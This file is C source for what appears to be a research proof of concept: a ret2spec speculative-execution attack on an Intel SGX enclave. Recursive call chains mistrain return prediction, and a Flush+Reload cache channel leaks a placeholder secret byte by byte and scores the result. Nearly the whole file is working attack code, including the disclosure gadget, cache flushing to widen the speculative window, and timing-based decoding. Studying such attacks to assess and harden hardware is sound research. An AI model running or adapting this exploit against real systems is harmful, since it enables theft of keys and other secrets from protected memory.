#include <stdio.h>
#include <string.h>
#include <assert.h>

# include <unistd.h>
# include <pwd.h>

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"

#include "libcache/cacheutils.h"

//#define DEBUG_PRINT
//#define TESTING
#define DATA "__________________"
//#define SECRET "INACCESSIBLESECRET"
#define SECRET "SSSSSSSSSSSSSSSSSS"

int idx;
char* secret_data;
const uint64_t kCacheLineBytes = 64;
const size_t kRecursionDepth = 128;

void (*return_true_base_case)();
void (*return_false_base_case)();

char* current_offset;
uint64_t stack_mark_pointers[512];
int stack_pointer = -1;

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

typedef struct _sgx_errlist_t {
    sgx_status_t err;
    const char *msg;
    const char *sug; /* Suggestion */
} sgx_errlist_t;

/* Error code returned by sgx_create_enclave */
static sgx_errlist_t sgx_errlist[] = {
    {
        SGX_ERROR_UNEXPECTED,
        "Unexpected error occurred.",
        NULL
    },
    {
        SGX_ERROR_INVALID_PARAMETER,
        "Invalid parameter.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_MEMORY,
        "Out of memory.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_LOST,
        "Power transition occurred.",
        "Please refer to the sample \"PowerTransition\" for details."
    },
    {
        SGX_ERROR_INVALID_ENCLAVE,
        "Invalid enclave image.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ENCLAVE_ID,
        "Invalid enclave identification.",
        NULL
    },
    {
        SGX_ERROR_INVALID_SIGNATURE,
        "Invalid enclave signature.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_EPC,
        "Out of EPC memory.",
        NULL
    },
    {
        SGX_ERROR_NO_DEVICE,
        "Invalid SGX device.",
        "Please make sure SGX module is enabled in the BIOS, and install SGX driver afterwards."
    },
    {
        SGX_ERROR_MEMORY_MAP_CONFLICT,
        "Memory map conflicted.",
        NULL
    },
    {
        SGX_ERROR_INVALID_METADATA,
        "Invalid enclave metadata.",
        NULL
    },
    {
        SGX_ERROR_DEVICE_BUSY,
        "SGX device was busy.",
        NULL
    },
    {
        SGX_ERROR_INVALID_VERSION,
        "Enclave version was invalid.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ATTRIBUTE,
        "Enclave was not authorized.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_FILE_ACCESS,
        "Can't open enclave file.",
        NULL
    },
    {
        SGX_ERROR_NDEBUG_ENCLAVE,
        "The enclave is signed as product enclave, and can not be created as debuggable enclave.",
        NULL
    },
    {
        SGX_ERROR_MEMORY_MAP_FAILURE,
        "Failed to reserve memory for the enclave.",
        NULL
    },
};

/* Check error conditions for loading enclave */
void print_error_message(sgx_status_t ret)
{
    size_t idx = 0;
    size_t ttl = sizeof sgx_errlist/sizeof sgx_errlist[0];

    for (idx = 0; idx < ttl; idx++) {
        if(ret == sgx_errlist[idx].err) {
            if(NULL != sgx_errlist[idx].sug)
                printf("Info: %s\n", sgx_errlist[idx].sug);
            printf("Error: %s\n", sgx_errlist[idx].msg);
            break;
        }
    }
    
    if (idx == ttl)
        printf("Error: Unexpected error occurred.\n");
}

/* Initialize the enclave:
 *   Call sgx_create_enclave to initialize an enclave instance
 */
int initialize_enclave(void)
{
    sgx_status_t ret = SGX_ERROR_UNEXPECTED;
    
    /* Call sgx_create_enclave to initialize an enclave instance */
    /* Debug Support: set 2nd parameter to 1 */
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &global_eid, NULL);
    if (ret != SGX_SUCCESS) {
        print_error_message(ret);
        return -1;
    }

    return 0;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */

    printf("%s", str);
}

char * create_secret() {
  // allocate secret
    char* secret = (char*)malloc(sizeof(char) * 128);

    if(secret == NULL) {
        printf("allocation of secret failed\n");
    }
    memcpy(secret, SECRET, sizeof(SECRET));

    return secret;
}

char * create_public() {
    char* public_data = (char*)malloc(sizeof(DATA)+1);

    if(public_data == NULL) {
        printf("allocation of public failed\n");
    }

    memcpy(public_data, DATA, sizeof(DATA));

    return public_data;
}

#ifdef TESTING

#define enclave_printf       printf
char leaked[sizeof(SECRET)];

void not_ecall_init_attack(uint64_t meme){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
#ifdef DEBUG_PRINT
    enclave_printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif
    mem = (char*)meme;

    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET) - 1] = 0;

    flush_shared_memory();
}

void not_ecall_encode(char c){
    cache_encode(c);
}

int not_ecall_cache_decode(int index){
    cache_decode_pretty(leaked, index);
    if (leaked[index] == SECRET[index]){
#ifdef DEBUG_PRINT
        enclave_printf("[%d] leaked: %c\t\n", index, leaked[index]);
#endif
        leaked[index] = ' ';
        return 1;
    }

    leaked[index] = ' ';
    return 0;
}
#endif


void stack_push(uint64_t *value){ 
    stack_pointer++;
    stack_mark_pointers[stack_pointer] = (uint64_t)value;
}

void stack_pop(){
    stack_pointer--;
}

uint64_t* stack_seek(){
    return (uint64_t*)stack_mark_pointers[stack_pointer];
}

void* StartOfNextCacheLine(void* addr) {
  uint64_t addr_n = (uint64_t)addr;

  // Create an address on the next cache line, then mask it to round it down to
  // cache line alignment.
  uint64_t next_n = (addr_n + kCacheLineBytes) & ~(kCacheLineBytes - 1);
  return (void*)next_n;
}

void* FlushFromDataCache(void* start, void* end, uint64_t fn_addr){
  void* st_addr = start + 0x38;  
  for (; start < end; start=StartOfNextCacheLine(start)){
    flush(start);
  }
  mfence();
  nospec();

  // Inteded to increase speculative window by adding delayed computation to the return address (correct offset if needed)
  return st_addr;
}

static void NopFunction() {}

__attribute__((aligned(4096))) void dead_code(char *arr){
    // Unreachable code. ReturnsFalse can never return true.
    // Disclosure Gadget
    char c = arr[0];
    // Transmission
    cache_encode(c);
    
    printf("Dead code. Must not be printed.\n");
}

// Always returns false.
int ReturnsFalse(int counter) {
  if (counter > 0) {
    if (ReturnsFalse(counter - 1)) {
        //dead_code(current_offset);
        cache_encode('S');
    }
  } else {
    // Increase the interference if running cross-address-space.
    return_true_base_case();
  }
  return 0;
}

static int ReturnsTrue(int counter) {
    // Creates a stack mark and stores it to the global vector.
    uint64_t stack_mark = (uint64_t)0x6463626160595857;
    stack_push(&stack_mark);

    if (counter > 0) {
        // Recursively invokes itself.
        ReturnsTrue(counter - 1);
    } else {
        // In the deepest invocation starts the ReturnsFalse recursion or
        // unschedule to increase the interference.
        return_false_base_case();
    }

    // Cleans-up its stack mark and flushes from the cache everything between its
    // own stack mark and the next one. Somewhere there must be also the return
    // address.
    stack_pop();

    uint64_t* st_addr = (uint64_t*)FlushFromDataCache(&stack_mark, (void*)stack_seek(), (uint64_t)ReturnsTrue);

    // Speculating on the return
    return 1;
}


#ifdef TESTING
#define ITER 500
#else
#define ITER 5000
#endif
int iterations = 0;

char Ret2specLeakByte() {
  for (int run = 0;; ++run) {
    flush_shared_memory();

    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
    // from an empty vector and crash.
    uint64_t stack_mark = (uint64_t)0x6463626160595857;
    stack_push(&stack_mark);
    
    ReturnsTrue(kRecursionDepth);
    stack_pop();

    mfence();
    nospec();

#ifdef TESTING
    for (int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
      if (flush_reload(mem + mix_i * pagesize)) {
        if (mix_i >= 'A' && mix_i <= 'Z') {
          // Found a candidate
          return (char)mix_i;
        }
      }
    }
#else
    int ret_val;
    sgx_status_t status = ecall_cache_decode(global_eid, &ret_val, (uint64_t)mem);
    if (status != SGX_SUCCESS) {
        printf("ERROR: ECall failed\n");
        print_error_message(status);
        printf("Enter a character before exit ...\n");
        getchar();
        return -1;
    } 

    if ( ret_val == 1){
      return 'S';
    }
#endif


    iterations++;
    if (run >= ITER - 1) {
      return '_';
    }
  }
}


__attribute__((noinline, used)) static int sim_call_stack(int counter){
  if (counter > 0) {
    // Recursively invokes itself.
    sim_call_stack(counter - 1);
  }
  return 0;
}

static void ReturnsFalseRecursion() {
#ifdef TESTING
  ReturnsFalse(kRecursionDepth);
  
  // simulate call stack
  sim_call_stack(14);

#else
    int ret_val;
    sgx_status_t status = ecall_return_false(global_eid, &ret_val, (uint64_t)kRecursionDepth);
    if (status != SGX_SUCCESS) {
        printf("ERROR: ECall failed\n");
        print_error_message(status);
    } 
#endif
}


/* Application entry */
int SGX_CDECL main(int argc, char *argv[])
{
#ifdef TESTING
    printf("[WARNING]: Running in testing mode (enclave is not used. Attack fully runs within the main process. This test should leak, as everythings reside in the same compartment! Comment the #define TESTING to run the PoC split up into enclave and main-process.)\n");
#endif

    (void)(argc);
    (void)(argv);
    uint64_t result = 0;
#ifdef DEBUG_PRINT
    printf("Start up!\n");
#endif

    /* Initialize the enclave */
    if(initialize_enclave() < 0){
        printf("Enter a character before exit ...\n");
        getchar();
        return -1; 
    }

    // ------ attack-code: ------ 
    pagesize = 4096;
    char *_mem = (char*)malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 1, pagesize * 256);
    

#ifdef TESTING
    not_ecall_init_attack((uint64_t)mem);
#else
    sgx_status_t status = ecall_init_attack(global_eid, (uint64_t)mem);
    if (status != SGX_SUCCESS) {
        printf("ERROR: ECall failed\n");
        print_error_message(status);
        printf("Enter a character before exit ...\n");
        getchar();
        return -1;
    } 
#endif

    secret_data = create_secret();

    char leaked[sizeof(SECRET) + 1];
    memset(leaked, '_', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;

    return_true_base_case = NopFunction;
    return_false_base_case = ReturnsFalseRecursion;

#ifdef DEBUG_PRINT
    printf("Secret %p\n", secret_data);
#endif

    flush_shared_memory();
    mfence();

    for (size_t i = 0; i < sizeof(SECRET) - 1; ++i) {
        current_offset = secret_data + i;
        char c = Ret2specLeakByte();
#ifdef DEBUG_PRINT
        printf("[%ld]: %c\n", i, c);
#endif
        leaked[i] = c;
    }
    int score=0;
    for (int i = 0; i < sizeof(SECRET); i++){
        // Do not include the space!
        if (leaked[i] == secret_data[i] && i != 12){
            score++;
        }
    }

    printf("%d, %d", iterations, score);
    if (score > 0){
        printf(" <--\n");
    }else{
        printf("\n");
    }

    // ------ attack-code: ------ 

    /* Destroy the enclave */
    sgx_destroy_enclave(global_eid);

#ifdef DEBUG_PRINT
    printf("Info: Measurement completed.\n");
#endif

    if ( 0 == result) {
#ifdef DEBUG_PRINT
        printf("Info: All test passed.\n");
#endif
    } else {
        printf("ERROR: ....\n");
    }
    return 0;
}